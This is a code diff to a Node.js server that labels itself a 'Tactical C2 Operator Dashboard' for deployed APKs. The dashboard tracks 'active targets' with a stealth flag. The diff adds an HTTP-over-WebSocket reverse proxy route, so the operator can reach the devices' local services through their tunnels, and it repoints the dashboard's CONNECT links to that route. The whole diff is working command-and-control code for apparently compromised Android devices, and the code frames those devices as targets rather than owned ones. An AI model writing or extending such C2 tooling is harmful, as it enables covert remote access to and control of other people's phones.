@@ -13,9 +13,10 @@ app.use(cors());
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 
-// In-memory telemetry, device registry, and active WebSocket tunnels
+// In-memory telemetry, device registry, active WebSocket tunnels, and pending proxy requests
 const devices = new Map();
 const socketConnections = new Map(); // deviceId -> ws socket
+const pendingRequests = new Map(); // requestId -> { res }
 const telemetryLogs = [];
 
 // WebSocket Tunnel Listener for deployed APKs
@@ -29,7 +30,20 @@ wss.on('connection', (ws, req) => {
     ws.on('message', (message) => {
         try {
             const data = JSON.parse(message.toString());
-            console.log(`[TUNNEL] Message from ${deviceId}:`, data.type);
+            if (data.type === 'response') {
+                const pending = pendingRequests.get(data.id);
+                if (pending) {
+                    pendingRequests.delete(data.id);
+                    const buf = Buffer.from(data.payload, 'base64');
+                    pending.res.status(data.status || 200);
+                    if (data.contentType) {
+                        pending.res.setHeader('Content-Type', data.contentType);
+                    }
+                    pending.res.send(buf);
+                }
+            } else {
+                console.log(`[TUNNEL] Message from ${deviceId}:`, data.type);
+            }
         } catch (e) {
             console.error('[TUNNEL] Parse error:', e.message);
         }
@@ -39,6 +53,41 @@ wss.on('connection', (ws, req) => {
         console.log(`[TUNNEL] WebSocket uplink closed for device: ${deviceId}`);
         socketConnections.delete(deviceId);
     });
+});
+
+// Secure HTTP-over-WebSocket Reverse Proxy Route for Render Dashboard
+app.all('/proxy*', (req, res) => {
+    const deviceId = req.query.deviceId;
+    if (!deviceId || !socketConnections.has(deviceId)) {
+        return res.status(404).send('<!DOCTYPE html><html><body style="background:#02080d;color:#00f2ff;font-family:monospace;padding:40px;text-align:center;"><h2>TARGET_OFFLINE</h2><p>The selected device has no active secure WebSocket reverse proxy tunnel connected to Render.</p></body></html>');
+    }
+
+    const ws = socketConnections.get(deviceId);
+    const requestId = Math.random().toString(36).substring(7);
+
+    let relayPath = req.originalUrl.replace('/proxy', '');
+    if (!relayPath.startsWith('/')) relayPath = '/' + relayPath;
+
+    pendingRequests.set(requestId, { res });
+
+    const tunnelReq = {
+        type: 'request',
+        id: requestId,
+        method: req.method,
+        path: relayPath,
+        body: req.method === 'POST' ? JSON.stringify(req.body) : ''
+    };
+
+    ws.send(JSON.stringify(tunnelReq));
+
+    setTimeout(() => {
+        if (pendingRequests.has(requestId)) {
+            pendingRequests.delete(requestId);
+            if (!res.headersSent) {
+                res.status(504).send('Tunnel Gateway Timeout');
+            }
+        }
+    }, 25000);
 });
 
 // Tactical C2 Operator Dashboard (HTML) at root URL
@@ -56,7 +105,7 @@ app.get('/', (req, res) => {
                 <td style="font-family: monospace; color: var(--neon-green);">${d.ip || 'N/A'}:${d.port || '9191'}</td>
                 <td>${d.stealth ? '<span style="color:var(--neon-orange)">STEALTH</span>' : '<span style="color:var(--neon-green)">NORMAL</span>'}</td>
                 <td style="font-size: 0.75rem; color: #aaa;">${new Date(d.lastSeen).toLocaleTimeString()}</td>
-                <td><a href="http://${d.ip || '127.0.0.1'}:${d.port || '9191'}" target="_blank" style="background: var(--neon-cyan); color: #000; padding: 6px 14px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.7rem;">CONNECT</a></td>
+                <td><a href="/proxy/?deviceId=${d.deviceId}" target="_blank" style="background: var(--neon-cyan); color: #000; padding: 6px 14px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.7rem;">CONNECT</a></td>
             </tr>
         `).join('');
 
@@ -104,7 +153,7 @@ app.get('/', (req, res) => {
         </div>
 
         <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
-            <div style="font-size: 0.8rem; color: #aaa;">SYSTEM STATUS: <span class="badge">ONLINE</span> &nbsp;|&nbsp; ACTIVE TARGETS: <span style="color: var(--neon-cyan); font-weight: bold;">${devices.size}</span> &nbsp;|&nbsp; TUNNELS: <span style="color: var(--neon-green); font-weight: bold;">${socketConnections.size}</span></div>
+            <div style="font-size: 0.8rem; color: #aaa;">SYSTEM STATUS: <span class="badge">ONLINE</span> &nbsp;|&nbsp; ACTIVE TARGETS: <span style="color: var(--neon-cyan); font-weight: bold;">${devices.size}</span> &nbsp;|&nbsp; SECURE TUNNELS: <span style="color: var(--neon-green); font-weight: bold;">${socketConnections.size}</span></div>
             <button class="refresh-btn" onclick="location.reload()">REFRESH_DASHBOARD</button>
         </div>
 
